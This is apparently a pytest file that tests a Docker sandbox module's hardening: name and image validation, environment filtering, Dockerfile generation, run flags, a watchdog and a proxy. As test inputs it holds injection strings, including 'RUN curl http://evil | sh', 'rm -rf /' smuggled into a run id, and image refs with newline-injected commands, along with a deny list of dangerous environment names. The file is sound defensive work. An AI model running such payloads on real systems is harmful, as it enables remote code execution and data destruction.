"""ROOK-014: DockerSandbox pieces that need no Docker daemon (names, env, Dockerfile, run flags, watchdog)."""

import json
import os
import stat
import subprocess
import sys
import time
from pathlib import Path

import pytest

from rook.agents.schemas import SandboxPlan
from rook.sandbox import DockerSandbox, Limits, SandboxError, base_image_for
from rook.sandbox.docker import (
    DEFAULT_USER,
    check_image_ref,
    container_env,
    generated_dockerfile,
    run_argv,
    run_user,
    sandbox_name,
)
from rook.sandbox.proxy import PROXY_IMAGE, PROXY_SCRIPT, proxy_run_argv
from rook.sandbox.reaper import check_name, cli_env

FAKE_SECRET = "fake-bob-key-not-real"


def _plan(**kw: object) -> SandboxPlan:
    return SandboxPlan.model_validate(
        {"mode": "command", "start": "python -m http.server 8000", "port": 8000, **kw}
    )


# --- names and images ---


@pytest.mark.parametrize(
    "run_id", ["r_8f2c", "../../etc; rm -rf /", "UPPER Case!", "", "-", "a" * 200, "x\ny"]
)
def test_sandbox_names_are_docker_safe_and_unique(run_id: str) -> None:
    first, second = sandbox_name(run_id), sandbox_name(run_id)
    assert first != second
    for name in (first, second):
        assert check_name(name) == name
        assert len(name) <= 64 and "/" not in name and ";" not in name and "\n" not in name


@pytest.mark.parametrize("name", ["evil", "rook-", "rook-a b", "rook-a\n", "rook-../x", "rook-A"])
def test_check_name_refuses_anything_else(name: str) -> None:
    with pytest.raises(ValueError):
        check_name(name)


@pytest.mark.parametrize(
    "ref", ["python:3.12-slim", "node:22-slim", "ghcr.io/org/app:1.0", "python@sha256:" + "a" * 64]
)
def test_valid_image_refs(ref: str) -> None:
    assert check_image_ref(ref) == ref


@pytest.mark.parametrize("ref", ["Python", "python:3.12\nRUN curl evil", "python 3", "", "-x", "a:b:c"])
def test_invalid_image_refs(ref: str) -> None:
    with pytest.raises(ValueError):
        check_image_ref(ref)


def test_base_image_for_language() -> None:
    assert base_image_for("Python") == "python:3.12-slim"
    assert base_image_for("typescript") == "node:22-slim"
    assert base_image_for(None) == "python:3.12-slim"


# --- env ---


def test_container_env_is_only_the_plan_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("BOB_API_KEY", FAKE_SECRET)
    monkeypatch.setenv("GITHUB_TOKEN", FAKE_SECRET)
    plan = _plan(env_required=["ADMIN_PASSWORD"], env_defaults={"MODE": "bugs"})
    env = container_env(plan, {"ADMIN_PASSWORD": "pw"})
    assert env == {"MODE": "bugs", "ADMIN_PASSWORD": "pw"}
    assert FAKE_SECRET not in json.dumps(env)


def test_missing_required_values_are_named() -> None:
    with pytest.raises(SandboxError, match="missing required setup values: \\['API_TOKEN'\\]"):
        container_env(_plan(env_required=["API_TOKEN"]), {})


def test_values_for_names_outside_the_plan_are_refused() -> None:
    with pytest.raises(ValueError, match="does not use"):
        container_env(_plan(), {"EXTRA": "x"})


@pytest.mark.parametrize(
    "name",
    [
        "BOB_API_KEY",
        "ROOK_TOKEN",
        "SUPABASE_SERVICE_ROLE_KEY",
        "DOCKER_HOST",
        "LD_PRELOAD",
        "PATH",
        "PYTHONPATH",
        "NODE_OPTIONS",
        "OPENSSL_CONF",
        "GLIBC_TUNABLES",
        "MALLOC_CHECK_",
        "lower",
    ],
)
def test_dangerous_or_host_env_names_are_refused(name: str) -> None:
    with pytest.raises(ValueError):
        container_env(_plan(env_defaults={name: "x"}), {})


@pytest.mark.parametrize("value", ["a\nB=c", "a\rb", "a\x00b"])
def test_env_values_cannot_break_the_env_file(value: str) -> None:
    with pytest.raises(ValueError):
        container_env(_plan(env_defaults={"GOOD": value}), {})


def test_cli_env_drops_rook_secrets() -> None:
    env = cli_env(
        {
            "PATH": "/usr/bin",
            "HOME": "/h",
            "DOCKER_HOST": "unix:///x",
            "BOB_API_KEY": FAKE_SECRET,
            "GITHUB_TOKEN": FAKE_SECRET,
            "SUPABASE_JWT_SECRET": FAKE_SECRET,
            "AWS_SECRET_ACCESS_KEY": "x",
        }
    )
    assert set(env) == {"PATH", "HOME", "DOCKER_HOST", "DOCKER_CLI_HINTS"}
    assert FAKE_SECRET not in env.values()


# --- generated Dockerfile ---


def test_generated_dockerfile_keeps_commands_in_exec_form() -> None:
    evil = "pip install x\nRUN curl http://evil | sh\nUSER root"
    text = generated_dockerfile("python:3.12-slim", evil, 'uvicorn app:app"]\nCMD ["sh')
    lines = text.splitlines()
    assert lines[0] == "FROM python:3.12-slim"
    assert [line.split()[0] for line in lines] == [
        "FROM",
        "WORKDIR",
        "COPY",
        "RUN",
        "RUN",
        "USER",
        "ENV",
        "CMD",
    ]
    assert json.loads(lines[3].removeprefix("RUN ")) == ["sh", "-c", evil]
    assert json.loads(lines[-1].removeprefix("CMD ")) == ["sh", "-c", 'uvicorn app:app"]\nCMD ["sh']
    assert f"USER {DEFAULT_USER}" in lines


def test_generated_dockerfile_without_build_step() -> None:
    text = generated_dockerfile("node:22-slim", None, "node server.js")
    assert text.count("RUN ") == 1  # only the chown of /app
    with pytest.raises(ValueError):
        generated_dockerfile("node:22-slim\nRUN x", None, "node server.js")


# --- docker run flags ---


def _argv(**kw: object) -> list[str]:
    args: dict[str, object] = {
        "name": "rook-x-abc123-app",
        "image": "rook-x-abc123:latest",
        "network": "rook-x-abc123",
        "env_file": Path("/tmp/rook/app.env"),
        "user": DEFAULT_USER,
        "labels": {"rook.run": "rook-x-abc123"},
        "limits": Limits(),
        "read_only": False,
        "start": None,
    }
    args.update(kw)
    return run_argv(**args)


def _flag(argv: list[str], flag: str) -> list[str]:
    return [argv[i + 1] for i, a in enumerate(argv) if a == flag]


def test_run_argv_has_every_hardening_flag() -> None:
    argv = _argv(read_only=True)
    assert _flag(argv, "--cap-drop") == ["ALL"]
    assert _flag(argv, "--security-opt") == ["no-new-privileges:true"]
    assert _flag(argv, "--pids-limit") == ["512"]
    assert _flag(argv, "--memory") == ["2g"] and _flag(argv, "--cpus") == ["2"]
    assert _flag(argv, "--user") == [DEFAULT_USER]
    assert _flag(argv, "--network") == ["rook-x-abc123"]
    assert _flag(argv, "--network-alias") == ["app"]
    assert "--publish" not in argv and "-p" not in argv  # only the proxy publishes
    assert _flag(argv, "--env-file") == ["/tmp/rook/app.env"]
    assert "--read-only" in argv and "--init" in argv
    assert _flag(argv, "--tmpfs")[0].startswith("/tmp:")
    for bad in (
        "--privileged",
        "--cap-add",
        "-v",
        "--volume",
        "--mount",
        "--device",
        "--pid",
        "--ipc",
        "-e",
        "--env",
    ):
        assert bad not in argv
    assert argv[-1] == "rook-x-abc123:latest"


def test_run_argv_overrides_the_command_without_a_host_shell() -> None:
    argv = _argv(start="npm start; echo $HOME")
    assert argv[argv.index("--entrypoint") + 1] == "sh"
    assert argv[-3:] == ["rook-x-abc123:latest", "-c", "npm start; echo $HOME"]


@pytest.mark.parametrize(
    ("image_user", "expected"),
    [
        ("", DEFAULT_USER),
        ("root", DEFAULT_USER),
        ("0", DEFAULT_USER),
        ("0:0", DEFAULT_USER),
        ("1000:0", DEFAULT_USER),
        ("node", DEFAULT_USER),
        ("1000", "1000"),
        ("1000:1000", "1000:1000"),
    ],
)
def test_run_user_keeps_only_numeric_non_root_users(image_user: str, expected: str) -> None:
    assert run_user(image_user) == expected


# --- DockerSandbox checks before any docker call ---


def test_workspace_must_be_a_folder(tmp_path: Path) -> None:
    with pytest.raises(SandboxError, match="not a folder"):
        DockerSandbox(tmp_path / "missing")


def test_start_needs_a_plan_and_its_required_values(tmp_path: Path) -> None:
    sandbox = DockerSandbox(tmp_path)
    with pytest.raises(SandboxError, match="needs a SandboxPlan"):
        sandbox.start(None)
    with pytest.raises(SandboxError, match="missing required setup values"):
        sandbox.start(_plan(env_required=["TOKEN"]))
    assert sandbox.name is None
    with pytest.raises(SandboxError, match="not started"):
        _ = sandbox.base_url
    with pytest.raises(SandboxError, match="not started"):
        sandbox.exec(["id"])
    sandbox.stop()  # nothing to do, no error


def test_bad_base_image_is_refused(tmp_path: Path) -> None:
    with pytest.raises(ValueError):
        DockerSandbox(tmp_path, base_image="python\nRUN curl evil")


# --- watchdog (with a fake docker on PATH) ---

FAKE_DOCKER = """#!/bin/sh
echo "$@" >> "$ROOK_FAKE_LOG_DIR/calls"
env >> "$ROOK_FAKE_LOG_DIR/env"
case "$1 $2" in
  "ps -aq") echo c1 ;;
esac
"""


def test_watchdog_sweeps_when_its_parent_pipe_closes(tmp_path: Path) -> None:
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    fake = bin_dir / "docker"
    fake.write_text(FAKE_DOCKER.replace("$ROOK_FAKE_LOG_DIR", str(tmp_path)))
    fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
    env = {"PATH": f"{bin_dir}:/usr/bin:/bin", "BOB_API_KEY": FAKE_SECRET, "HOME": str(tmp_path)}
    proc = subprocess.Popen(
        [sys.executable, "-m", "rook.sandbox.reaper", "rook-test-abc123"],
        stdin=subprocess.PIPE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        env=env,
    )
    time.sleep(0.3)
    assert proc.poll() is None, "the watchdog must wait while the pipe is open"
    assert not (tmp_path / "calls").exists()
    assert proc.stdin is not None
    proc.stdin.close()  # the Rook process "died"
    assert proc.wait(timeout=30) == 0
    calls = (tmp_path / "calls").read_text().splitlines()
    assert "ps -aq --filter label=rook.run=rook-test-abc123" in calls
    assert "rm -f -v c1" in calls
    assert FAKE_SECRET not in (tmp_path / "env").read_text()


def test_watchdog_rejects_bad_names() -> None:
    proc = subprocess.run(
        [sys.executable, "-m", "rook.sandbox.reaper", "--all"],
        stdin=subprocess.DEVNULL,
        capture_output=True,
        env={**os.environ, "PATH": "/nonexistent"},
        check=False,
    )
    assert proc.returncode != 0


def test_proxy_is_the_only_published_container_and_is_hardened() -> None:
    argv = proxy_run_argv(
        name="rook-x-abc123-proxy",
        network="rook-x-abc123-pub",
        host_port=None,
        target_port=3000,
        labels={"rook.run": "rook-x-abc123"},
    )
    assert _flag(argv, "--publish") == ["127.0.0.1::8080"]
    assert _flag(argv, "--network") == ["rook-x-abc123-pub"]
    assert _flag(argv, "--cap-drop") == ["ALL"] and "--read-only" in argv
    assert _flag(argv, "--user") == ["65534:65534"]
    assert _flag(argv, "--label") == ["rook.run=rook-x-abc123"]
    assert argv[argv.index(PROXY_IMAGE) :] == [
        PROXY_IMAGE,
        "python",
        "-c",
        PROXY_SCRIPT,
        "8080",
        "app",
        "3000",
    ]
    again = proxy_run_argv(name="p", network="n", host_port=41234, target_port=3000, labels={})
    assert _flag(again, "--publish") == ["127.0.0.1:41234:8080"]
